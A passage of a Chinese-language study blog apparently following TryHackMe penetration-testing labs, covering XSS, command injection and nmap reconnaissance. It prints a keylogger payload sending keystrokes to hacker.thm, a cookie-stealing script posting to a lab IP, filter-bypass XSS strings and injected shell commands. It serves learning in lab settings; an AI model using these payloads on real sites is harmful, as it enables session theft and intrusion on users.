<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.onkeypress = function(e) &#123; fetch(&#x27;https://hacker.thm/log?key=&#x27; + btoa(e.key) );&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>业务逻辑</strong></p>
<p>假设有一个用于更改用户电子邮件地址的 JavaScript 函数，名为<code>user.changeEmail()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;user.changeEmail(&#x27;attacker@hacker.thm&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>现在帐户的电子邮件地址已更改，攻击者可能会执行重置密码攻击。</p>
<h4 id="Task2-反射型XSS"><a href="#Task2-反射型XSS" class="headerlink" title="Task2 反射型XSS"></a>Task2 反射型XSS</h4><blockquote>
<p>当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型 XSS。</p>
</blockquote>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913092903568.png"></p>
<h4 id="Task3-存储型XSS"><a href="#Task3-存储型XSS" class="headerlink" title="Task3 存储型XSS"></a>Task3 存储型XSS</h4><blockquote>
<p>顾名思义， XSS有效负载存储在 Web 应用程序中（例如数据库中），然后在其他用户访问该网站或网页时运行。</p>
</blockquote>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913092957145.png"></p>
<h4 id="Task4-基于DOM的XSS"><a href="#Task4-基于DOM的XSS" class="headerlink" title="Task4 基于DOM的XSS"></a>Task4 基于DOM的XSS</h4><p><strong>什么是 DOM？</strong></p>
<p>DOM 代表文档对象模型，是 HTML 和XML文档的编程接口。它代表页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，该文档可以显示在浏览器窗口中，也可以作为 HTML 源代码显示。 HTML DOM 的图表如下所示：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913093257784.png"> <strong>利用 DOM</strong></p>
<p>DOM 基于XSS是指 JavaScript 直接在浏览器中执行，无需加载任何新页面或将数据提交给后端代码。当网站 JavaScript 代码作用于输入或 用户交互。</p>
<p><strong>示例场景：</strong></p>
<p>网站的 JavaScript 从<code>window.location.hash</code>获取内容 参数，然后将其写入当前正在使用的页面上 已查看部分。不会检查哈希内容是否存在恶意 代码，允许攻击者将他们选择的 JavaScript 注入到 网页。</p>
<p><strong>潜在影响：</strong></p>
<p>精心制作的链接 可以发送给潜在的受害者，将他们重定向到另一个网站 或从页面或用户会话中窃取内容。</p>
<p><strong>如何测试基于 Dom 的XSS ：</strong></p>
<p>基于 DOM 的 XSS 测试可能具有挑战性，并且需要一定的 JavaScript 知识才能阅读源代码。您需要查找访问攻击者可以控制的某些变量的代码部分，例如“ <strong>window.location.x</strong> ”参数。</p>
<p>当您找到这些代码时，您需要查看它们是如何处理的，以及这些值是否被写入网页的 DOM 或传递给不安全的 JavaScript 方法，例如<strong>eval()</strong> 。</p>
<h4 id="Task5-XSS盲注"><a href="#Task5-XSS盲注" class="headerlink" title="Task5 XSS盲注"></a>Task5 XSS盲注</h4><p>使用XSS Hunter Express工具会自动捕获 cookie、URL、页面内容等</p>
<p>工具地址：<code>https://github.com/mandatoryprogrammer/xsshunter-express</code></p>
<h4 id="Task6-完善payload"><a href="#Task6-完善payload" class="headerlink" title="Task6 完善payload"></a>Task6 完善payload</h4><h5 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094223521.png"></p>
<h5 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h5><p>我们继续用上面payload测试，发现失败。查看源码原来是我们的被嵌入到value元素了</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094334820.png"></p>
<p>修改下payload，把前面的input标签闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094541684.png"></p>
<h5 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h5><p>拿最普通payload测试，出现了<code>&lt;textarea&gt;</code>标签</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094721757.png"></p>
<blockquote>
<p><code>&lt;textarea&gt;</code> 标签在HTML中用于创建一个可以让用户输入多行文本的输入控件，通常用于表单中的留言、评论或较长文本的输入。与 <code>&lt;input type=&quot;text&quot;&gt;</code> 类似，但它可以容纳更多的文本，并且文本区域的大小可以调整（虽然默认情况下是固定的，可以通过CSS来改变）。</p>
</blockquote>
<p>我们闭合前面即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094850215.png"></p>
<h5 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h5><p>测试发现失败，查看源码注意到下面代码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095227120.png"></p>
<p>我们修改下payload，把前后的单引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(&#x27;THM&#x27;);&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095344657.png"></p>
<h5 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h5><p>输入正常payload，发现关键字被过滤了</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095443765.png"></p>
<p>修改payload，大小写绕过下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCript&gt;alert(&#x27;THM&#x27;)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095543224.png"></p>
<h5 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h5><p>只能输入图片的路径，前后闭合下双引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/images/1.jpg&quot; onerror=&quot;alert(&#x27;THM&#x27;);  #也可以/images/cat.jpg&quot; onload=&quot;alert(&#x27;THM&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913100019577.png"></p>
<h4 id="Task7-实战"><a href="#Task7-实战" class="headerlink" title="Task7 实战"></a>Task7 实战</h4><p>打开靶机，创建好用户后点击Support Tickets，创建个票据来测试是否存在XSS漏洞</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913101657639.png"></p>
<p>发现又是<code>&lt;textarea&gt;</code>标签，我们重新创建一个票据，把前面payload复制到内容处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>成功测试出XSS漏洞</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913101937482.png"></p>
<p>我们在服务器开启监听来窃取其他访问我们票据的用户cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;fetch(&#x27;http://10.10.110.189:777/?cookie=&#x27;+btoa(document.cookie));&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913102409586.png"></p>
<p>成功窃取其他用户的cookie，base64解码一下即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913102457236.png"></p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>打开靶机，发现是一个测试设备IP的</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913145602217.png"></p>
<p>使用<code>;</code>添加执行的命令，查看当前用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;whoami</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913145733963.png"></p>
<p>cat命令查看flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat /home/tryhackme/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913145717026.png"></p>
<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="被动识别"><a href="#被动识别" class="headerlink" title="被动识别"></a>被动识别</h3><h4 id="Task1-whois"><a href="#Task1-whois" class="headerlink" title="Task1 whois"></a>Task1 whois</h4><p>使用在线网站查询域名</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913153238106.png"></p>
<h4 id="Task2-nslookup"><a href="#Task2-nslookup" class="headerlink" title="Task2 nslookup"></a>Task2 nslookup</h4><p>使用 nslookup 查找域名的 IP 地址，参数如下</p>
<table>
<thead>
<tr>
<th>查询类型</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>IPv4 地址</td>
</tr>
<tr>
<td>AAAA</td>
<td>IPv6 地址</td>
</tr>
<tr>
<td>CNAME</td>
<td>规范名称</td>
</tr>
<tr>
<td>MX</td>
<td>邮件服务器</td>
</tr>
<tr>
<td>SOA</td>
<td>授权开始</td>
</tr>
<tr>
<td>TXT</td>
<td>TXT 记录</td>
</tr>
</tbody></table>
<p>发出命令 <code>nslookup DOMAIN_NAME</code>，例如 <code>nslookup tryhackme.com</code>。或者可以使用 <code>nslookup OPTIONS DOMAIN_NAME SERVER</code> 。这三个主要参数是：</p>
<ul>
<li>OPTIONS 包含下表所示的查询类型。例如，您可以将 <code>A</code> 用于 IPv4 地址，将 <code>AAAA</code> 用于 IPv6 地址。</li>
<li>DOMAIN_NAME 是您要查找的域名。</li>
<li>SERVER 是要查询的 DNS 服务器。您可以选择任何本地或公有 DNS 服务器进行查询。Cloudflare 提供 <code>1.1.1.1</code> 和 <code>1.0.0.1，Google</code> 提供 <code>8.8.8.8</code> 和 <code>8.8.4.4，Quad9</code> 提供 <code>9.9.9.9</code> 和 <code>149.112.112.112。</code></li>
</ul>
<table>
<thead>
<tr>
<th>目的</th>
<th>命令行示例</th>
</tr>
</thead>
<tbody><tr>
<td>查找 DNS A 记录</td>
<td><code>nslookup -type=A tryhackme.com</code></td>
</tr>
<tr>
<td>在 DNS 服务器上查找 DNS MX 记录</td>
<td><code>nslookup -type=MX tryhackme.com 1.1.1.1</code></td>
</tr>
<tr>
<td>查找 DNS TXT 记录</td>
<td><code>nslookup -type=TXT tryhackme.com</code></td>
</tr>
</tbody></table>
<h4 id="Task3-DNSDumpster"><a href="#Task3-DNSDumpster" class="headerlink" title="Task3 DNSDumpster"></a>Task3 DNSDumpster</h4><p>可以使用为 DNS 查询提供详细答案的在线服务，例如 <a target="_blank" rel="noopener" href="https://dnsdumpster.com/">DNSDumpster</a>。如果我们在 DNSDumpster 中搜索 <code>tryhackme.com</code>，我们会发现子域 <code>blog.tryhackme.com</code>，这是典型的 DNS 查询无法提供的。此外，DNSDumpster 会将收集到的 DNS 信息以易于阅读的表格和图表形式返回。DNSDumpster 还将提供有关侦听服务器的任何收集信息。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913154706795.png"></p>
<h4 id="Task4-Shodan-io"><a href="#Task4-Shodan-io" class="headerlink" title="Task4 Shodan.io"></a>Task4 Shodan.io</h4><p>此记录显示 Web 服务器;但是，如前所述，Shodan.io 会收集与它可以在网上找到的任何连接设备相关的信息。在 Shodan.io 上搜索 <code>tryhackme.com</code> 将至少显示上面屏幕截图中显示的记录。通过这个 Shodan.io 搜索结果，我们可以了解与我们的搜索相关的几件事，例如：</p>
<ul>
<li>IP地址</li>
<li>托管公司</li>
<li>地理位置</li>
<li>服务器类型和版本</li>
</ul>
<h3 id="主动侦察"><a href="#主动侦察" class="headerlink" title="主动侦察"></a>主动侦察</h3><h4 id="Task1-浏览器"><a href="#Task1-浏览器" class="headerlink" title="Task1 浏览器"></a>Task1 浏览器</h4><p>可以利用web开发者工具或者Wappalyzer插件去信息搜集</p>
<h4 id="Task2-ping"><a href="#Task2-ping" class="headerlink" title="Task2 ping"></a>Task2 ping</h4><blockquote>
<p>确保目标系统在线</p>
</blockquote>
<p>一般来说，当我们没有收到 ping 回复时，有一些解释可以解释为什么我们没有收到 ping 回复，例如：</p>
<ul>
<li>目标计算机没有响应;可能仍在启动或关闭，或者操作系统已崩溃。</li>
<li>它已从网络中拔下，或者路径上有故障的网络设备。</li>
<li>防火墙配置为阻止此类数据包。防火墙可能是在系统本身上运行的软件，也可能是单独的网络设备。请注意，MS Windows 防火墙默认阻止 ping。</li>
<li>您的系统已从网络中拔下。</li>
</ul>
<h4 id="Task3-路由跟踪"><a href="#Task3-路由跟踪" class="headerlink" title="Task3 路由跟踪"></a>Task3 路由跟踪</h4><blockquote>
<p>顾名思义，traceroute 命令跟踪数据包从系统到另一台主机的<em>路由</em>。traceroute 的目的是查找数据包在从系统传输到目标主机时经过的路由器或跃点的 IP  地址。此命令还显示两个系统之间的路由器数量。它非常有用，因为它指示系统和目标主机之间的跃点（路由器）数。但是，请注意，数据包采用的路由可能会发生变化，因为许多路由器使用适应网络变化的动态路由协议。</p>
</blockquote>
<p>尝试发现从系统到目标系统的路径上的路由器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute 10.10.10.1</span><br></pre></td></tr></table></figure>

<h4 id="Task4-telnet"><a href="#Task4-telnet" class="headerlink" title="Task4 telnet"></a>Task4 telnet</h4><p>使用 <code>telnet 10.10.110.51 PORT</code>，您可以连接到在 TCP 上运行的任何服务，甚至可以交换一些消息，除非它使用加密。我们可以添加上一些内容获得有效的响应，添加好后按两下回车即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">host: telnet   #随便写一个</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913164204747.png"></p>
<h3 id="nmap探测存活主机"><a href="#nmap探测存活主机" class="headerlink" title="nmap探测存活主机"></a>nmap探测存活主机</h3><h4 id="Task1-子网"><a href="#Task1-子网" class="headerlink" title="Task1 子网"></a>Task1 子网</h4><blockquote>
<p>在继续执行主要任务之前，让我们回顾一下几个术语。<em>网段</em>是使用共享介质连接的一组计算机。例如，介质可以是以太网交换机或 WiFi 接入点。在 IP 网络中，<em>子网</em>通常相当于一个或多个网络连接在一起并配置为使用同一路由器的网段。网段是指物理连接，而子网是指逻辑连接。</p>
</blockquote>
<p>在下面的网络图中，我们有四个网段或子网。一般来说，您的系统将连接到这些网段&#x2F;子网之一。子网（或简称子网）具有自己的 IP 地址范围，并通过路由器连接到更广泛的网络。根据每个网络，可能存在强制实施安全策略的防火墙。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913170558420.png"></p>
<p>上图显示了两种类型的子网：</p>
<ul>
<li>带有 <code>/16</code> 的子网，这意味着子网掩码可以写入 <code>255.255.0.0。</code>此子网可以有大约 65,000 台主机。</li>
<li>子网替换为 <code>/24</code> ，这表示子网掩码可以表示为 <code>255.255.255.0</code> 。此子网可以有大约 250 个主机。</li>
</ul>
<h4 id="Task2-枚举目标"><a href="#Task2-枚举目标" class="headerlink" title="Task2 枚举目标"></a>Task2 枚举目标</h4><p>如果您想检查 Nmap 将扫描的主机列表，您可以使用<code>-sL</code>参数。此选项将为您提供 Nmap 将扫描而不扫描的主机的详细列表</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913171729299.png"></p>
<h4 id="Task3-使用-ARP-的-Nmap-主机发现"><a href="#Task3-使用-ARP-的-Nmap-主机发现" class="headerlink" title="Task3 使用 ARP 的 Nmap 主机发现"></a>Task3 使用 ARP 的 Nmap 主机发现</h4><p>如果要使用 Nmap 来发现在线主机，而不对实时系统进行端口扫描，可以使用<code>-sn</code>参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PR -sn 10.10.210.6/24</span><br></pre></td></tr></table></figure>

<p>注：其中 <code>-PR</code> 表示只需要 ARP 扫描</p>
<h4 id="Task4-使用-ICMP-的-Nmap-主机发现"><a href="#Task4-使用-ICMP-的-Nmap-主机发现" class="headerlink" title="Task4 使用 ICMP 的 Nmap 主机发现"></a>Task4 使用 ICMP 的 Nmap 主机发现</h4><p>要使用 ICMP 回显请求来发现活动主机，使用参数<code>-PE</code> （如果不在后面进行端口扫描，添加<code>-sn</code> ）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PE -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<p>使用 ICMP 地址掩码查询发现活动主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PM -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<p>使用 ICMP 时间戳发现活动主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PP -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<h4 id="Task5-使用-TCP-和-UDP-的-Nmap-主机发现"><a href="#Task5-使用-TCP-和-UDP-的-Nmap-主机发现" class="headerlink" title="Task5 使用 TCP 和 UDP 的 Nmap 主机发现"></a>Task5 使用 TCP 和 UDP 的 Nmap 主机发现</h4><p>TCP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PS -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数：-PS&#x2F;PA  TCP SYN&#x2F;ACK</p>
</blockquote>
<p>UDP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PU -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<h3 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h3><h4 id="Task1-TCP和UDP端口"><a href="#Task1-TCP和UDP端口" class="headerlink" title="Task1 TCP和UDP端口"></a>Task1 TCP和UDP端口</h4><blockquote>
<p>与 IP 地址指定网络上的主机以及其他主机一样，TCP 端口或 UDP 端口也用于标识该主机上运行的网络服务。服务器提供网络服务，并且遵循特定的网络协议。示例包括提供时间、响应 DNS 查询以及提供网页。端口通常使用该特定端口号链接到服务。例如， HTTP服务器默认绑定到 TCP 端口 80；此外，如果HTTP服务器支持 SSL&#x2F;TLS，它将侦听 TCP 端口 443。（TCP 端口 80 和 443 是HTTP和 HTTPS 的默认端口；但是，网络服务器管理员可以根据需要选择其他端口号。）此外，最多只有一个服务可以侦听任何 TCP 或UDP端口（同一 IP 地址）。</p>
</blockquote>
<p>冒着过于简单化的风险，我们可以将端口分为两种状态：</p>
<ol>
<li>打开端口表示有某个服务正在侦听该端口。</li>
<li>关闭端口表示该端口没有服务监听。</li>
</ol>
<p>但在实际情况中，我们需要考虑防火墙的影响。例如，端口可能是开放的，但防火墙可能会阻止数据包。因此， Nmap考虑以下六种状态：</p>
<ol>
<li><strong>Open</strong> ：表示有服务正在监听指定端口。</li>
<li><strong>Closed</strong> ：表示没有服务正在侦听指定端口，尽管该端口是可访问的。可访问是指它是可访问的并且不会被防火墙或其他安全设备&#x2F;程序阻止。</li>
<li><strong>Filtered</strong> ：表示Nmap无法确定端口是打开还是关闭，因为该端口不可访问。这种状态通常是由于防火墙阻止Nmap到达该端口造成的。 Nmap的数据包可能被阻止到达端口；或者，响应被阻止到达Nmap的主机。</li>
<li><strong>Unfiltered</strong> ：表示尽管端口可以访问，但Nmap无法确定端口是打开还是关闭。使用 ACK 扫描<code>-sA</code>时会遇到此状态。</li>
<li><strong>Open|Filtered</strong> ：这意味着Nmap无法确定端口是开放的还是已过滤的。</li>
<li><strong>Closed|Filtered</strong> ：这意味着Nmap无法决定端口是关闭还是过滤。</li>
</ol>
<h4 id="Task2-TCP连接扫描"><a href="#Task2-TCP连接扫描" class="headerlink" title="Task2 TCP连接扫描"></a>Task2 TCP连接扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 10.10.10.2</span><br></pre></td></tr></table></figure>

<p>注：使用<code>-F</code>启用快速模式并将扫描端口的数量从 1000 个最常见端口减少到 100 个。</p>
<p>​		使用<code>-r</code>选项以连续顺序而不是随机顺序扫描端口。</p>
<p><strong>TCP SYN</strong></p>
<blockquote>
<p>TCP SYN 扫描是以特权用户身份运行 Nmap、以 root 身份运行或使用 sudo 运行 Nmap 时的默认扫描模式，它是一个非常可靠的选择。它已成功发现您之前通过TCP连接扫描找到的开放端口，但尚未与目标完全建立TCP连接。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 10.10.10.2</span><br></pre></td></tr></table></figure>

<h4 id="Task3-UDP连接扫描"><a href="#Task3-UDP连接扫描" class="headerlink" title="Task3 UDP连接扫描"></a>Task3 UDP连接扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 10.10.10.2</span><br></pre></td></tr></table></figure>

<h4 id="Task4-调整范围和性能"><a href="#Task4-调整范围和性能" class="headerlink" title="Task4 调整范围和性能"></a>Task4 调整范围和性能</h4><h5 id="扫描端口范围"><a href="#扫描端口范围" class="headerlink" title="扫描端口范围"></a>扫描端口范围</h5><p>您可以指定要扫描的端口，而不是默认的 1000 个端口。比如下面这样</p>
<ul>
<li>端口列表： <code>-p22,80,443</code>将扫描端口 22、80 和 443。</li>
<li>端口范围： <code>-p1-1023</code>将扫描 1 到 1023（含）之间的所有端口，而<code>-p20-25</code>将扫描 20 到 25（含）之间的端口。</li>
</ul>
<p>可以使用<code>-p-</code>请求扫描所有端口，这将扫描所有 65535 端口。如果要扫描最常见的 100 个端口，请添加<code>-F</code> 。使用<code>--top-ports 10</code>将检查十个最常见的端口。</p>
<h5 id="扫描速度"><a href="#扫描速度" class="headerlink" title="扫描速度"></a>扫描速度</h5><p>您可以使用<code>-T&lt;0-5&gt;</code>控制扫描时序。 <code>-T0</code>是最慢的（偏执），而<code>-T5</code>是最快的。</p>
<p>为了避免IDS警报，您可以考虑<code>-T0</code>或<code>-T1</code> 。例如， <code>-T0</code>一次扫描一个端口，并在发送每个探测之间等待 5 分钟，因此您可以猜测扫描一个目标需要多长时间才能完成。如果您不指定任何时间， Nmap将使用正常的<code>-T3</code> 。请注意， <code>-T5</code>就速度而言是最具侵略性的；但是，由于丢包的可能性增加，这可能会影响扫描结果的准确性。请注意， <code>-T4</code>通常在 CTF 期间和学习扫描练习目标时使用，而<code>-T1</code>通常在隐秘性更重要的真实交战中使用。</p>
<p>或者，您可以选择使用<code>--min-rate &lt;number&gt;</code>和<code>--max-rate &lt;number&gt;</code>控制数据包速率。例如， <code>--max-rate 10</code>或<code>--max-rate=10</code>可确保您的扫描仪每秒发送的数据包不超过 10 个。</p>
<h3 id="Nmap-后端口扫描"><a href="#Nmap-后端口扫描" class="headerlink" title="Nmap 后端口扫描"></a>Nmap 后端口扫描</h3><h4 id="Task1-服务检测"><a href="#Task1-服务检测" class="headerlink" title="Task1 服务检测"></a>Task1 服务检测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV MACHINE_IP</span><br></pre></td></tr></table></figure>

<h4 id="Task2-保存输出"><a href="#Task2-保存输出" class="headerlink" title="Task2 保存输出"></a>Task2 保存输出</h4><p>使用普通模式保存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -O -oN 1_scan 10.10.10.2</span><br></pre></td></tr></table></figure>

<h3 id="协议和服务1"><a href="#协议和服务1" class="headerlink" title="协议和服务1"></a>协议和服务1</h3><h4 id="Task1-telnet远程登录"><a href="#Task1-telnet远程登录" class="headerlink" title="Task1 telnet远程登录"></a>Task1 telnet远程登录</h4><p>Telnet 服务使用 Telnet 协议监听端口 23 上的传入连接。尽管 Telnet  使我们能够立即访问远程系统的终端，但它并不是一个可靠的远程管理协议，因为所有数据都以明文形式发送。下图中，我们捕获了Telnet产生的流量，很容易找到密码。下图显示了我们的计算机和远程系统之间交换的 ASCII  数据。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913233015796.png"></p>
<p>Telnet 不再被视为安全选项，尤其是任何捕获您的网络流量的人都将能够发现您的用户名和密码，这将授予他们访问远程系统的权限。安全的替代方案是SSH</p>
<h4 id="Task2-HTTP"><a href="#Task2-HTTP" class="headerlink" title="Task2 HTTP"></a>Task2 HTTP</h4><p>HTTP以明文形式发送和接收数据（未加密）；因此，您可以使用简单的工具，例如 Telnet（或 Netcat），与 Web 服务器通信并充当“Web 浏览器”。主要区别在于您需要输入HTTP相关命令，而不是 Web 浏览器为您执行此操作。</p>
<h4 id="Task3-FTP-文件传输协议"><a href="#Task3-FTP-文件传输协议" class="headerlink" title="Task3 FTP 文件传输协议"></a>Task3 FTP 文件传输协议</h4><p>文件传输协议（ FTP ）的开发是为了使不同系统的不同计算机之间的文件传输更加高效。FTP还以明文形式发送和接收数据；因此，我们可以使用Telnet（或Netcat）与FTP服务器通信并充当FTP客户端。默认监听端口为21。</p>
<p>利用给的用户名和密码进行ftp登录，get命令下载flag到本机</p>
<ul>
<li>Username: frank</li>
<li>Password: D2xc9CgD</li>
</ul>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913234206931.png"></p>
<h4 id="Task4-SMTP-简单邮件传输协议"><a href="#Task4-SMTP-简单邮件传输协议" class="headerlink" title="Task4 SMTP 简单邮件传输协议"></a>Task4 SMTP 简单邮件传输协议</h4><p>简单邮件传输协议 (SMTP) 用于与MTA服务器进行通信。由于 SMTP 使用明文，所有命令均在不加密的情况下发送，因此我们可以使用基本的 Telnet 客户端连接到 SMTP 服务器并充当发送消息的电子邮件客户端 ( MUA )。SMTP服务器默认监听端口 25。</p>
<h4 id="Task5-POP3-邮局协议3"><a href="#Task5-POP3-邮局协议3" class="headerlink" title="Task5 POP3 邮局协议3"></a>Task5 POP3 邮局协议3</h4><p>POP3默认端口 110</p>
<p>用户通过提供用户名<code>USER frank</code>和密码<code>PASS D2xc9CgD</code>进行身份验证。使用命令<code>STAT</code> ，我们得到回复<code>+OK 1 179</code> ；根据<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1939">RFC 1939</a> ，对<code>STAT</code>肯定响应格式为<code>+OK nn mm</code> ，其中<em>nn</em>是收件箱中的电子邮件数量， <em>mm</em>是收件箱的大小（以八位位组（字节）为单位）。命令<code>LIST</code>提供服务器上的新消息列表， <code>RETR 1</code>检索列表中的第一条消息。我们不需要费力去记住这些命令；不过，这有助于加强我们对此类协议的理解。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-10-7-230:~# telnet 10.10.202.102 110</span><br><span class="line">Trying 